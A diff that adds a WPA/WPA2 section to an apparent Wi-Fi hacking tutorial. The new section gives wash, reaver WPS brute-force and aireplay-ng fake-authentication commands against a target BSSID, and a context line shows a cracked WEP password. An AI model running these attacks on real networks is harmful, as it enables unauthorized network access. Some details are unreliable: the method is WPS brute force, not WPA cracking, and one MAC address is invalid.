@@ -22,6 +22,7 @@
   - [Gaining Access](#gaining-access)
     - [WEP Cracking](#wep-cracking)
     - [Fake Authentication](#fake-authentication)
+    - [WPA/WPA2 Cracking](#wpa-wpa2-cracking)
 
 
   - [Post Connection Attacks](#post-connection-attacks)
@@ -319,6 +320,37 @@ see that KEY
 Remove all colon symbol ":" in that key found [41:45:76:98]
 
 > Password : 41457698
+<br><br>
+
+### WPA WPA2 Cracking
+
+**Open terminal - 1**
+> see all the WPS enable Networks <br>
+> Find MAC Address and channel
+```
+wash --interface wlan0mon
+airmon-ng wlan0mon
+```
+<br>
+
+**Open terminal - 2**
+
+> using *reaver* to do the brute forcing and cracking WPS enable network
+```
+reaver --bssid 70:97:41:DA:E0:5B --channel 1 --interface wlan0mon -vvv --no-associate
+```
+bssid - target MAC Address <br>
+-vvv - show more information as possible <br>
+no-associate - to tell reaver no to associate with the target network
+<br>
+
+**Open terminal - 3**
+> fake authentication attack
+```
+aireplay-ng --fakeauth 30 -a 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
+```
+-a - target MAC Address <br>
+-h - interface MAC Address
 
 
 
